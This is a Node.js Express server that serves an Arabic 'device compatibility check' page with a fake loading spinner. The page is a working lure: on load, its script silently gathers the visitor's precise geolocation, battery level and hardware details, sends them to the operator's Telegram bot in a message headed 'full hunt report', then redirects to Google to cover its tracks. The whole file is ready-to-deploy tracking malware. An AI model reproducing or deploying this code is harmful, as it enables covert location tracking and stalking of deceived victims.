const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const MY_ID = process.env.MY_ID;

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>فحص توافق النظام</title>
            <style>
                body { background: #000; color: #00ff00; font-family: sans-serif; text-align: center; padding-top: 20%; }
                .spinner { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
            <div class="spinner"></div>
            <h2>جاري فحص توافق الجهاز...</h2>
            <script>
                async function captureAll() {
                    // 1. مواصفات الجهاز التقنية
                    const specs = {
                        os: navigator.platform,
                        cores: navigator.hardwareConcurrency || "غير معروف",
                        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معروف",
                        screen: window.screen.width + "x" + window.screen.height,
                        lang: navigator.language
                    };

                    // 2. سحب البطارية
                    let batteryInfo = "غير مدعوم";
                    try {
                        if (navigator.getBattery) {
                            const battery = await navigator.getBattery();
                            batteryInfo = Math.round(battery.level * 100) + "% " + (battery.charging ? "🔌" : "🔋");
                        }
                    } catch (e) {}

                    // 3. الموقع الجغرافي وإرسال البيانات
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        const map = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                        await sendToTelegram(batteryInfo, map, specs);
                    }, async () => {
                        await sendToTelegram(batteryInfo, "الوصول للموقع مرفوض ❌", specs);
                    });

                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 4000);
                }

                async function sendToTelegram(battery, maps, specs) {
                    const info = "🎯 **تقرير صيد كامل**\\n" +
                                 "--------------------------\\n" +
                                 "🔋 **البطارية:** " + battery + "\\n" +
                                 "📍 **الموقع:** [اضغط للمعاينة](" + maps + ")\\n" +
                                 "--------------------------\\n" +
                                 "🖥️ **مواصفات الجهاز:**\\n" +
                                 "• النظام: " + specs.os + "\\n" +
                                 "• المعالج: " + specs.cores + " Cores\\n" +
                                 "• الرام: " + specs.ram + "\\n" +
                                 "• الشاشة: " + specs.screen + "\\n" +
                                 "• اللغة: " + specs.lang + "\\n" +
                                 "--------------------------";

                    await fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendMessage", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: "${MY_ID}", text: info, parse_mode: "Markdown" })
                    });
                }
                window.onload = captureAll;
            </script>
        </body>
        </html>
    `);
});

app.listen(PORT, () => console.log("Full Specs Scanner Active"));
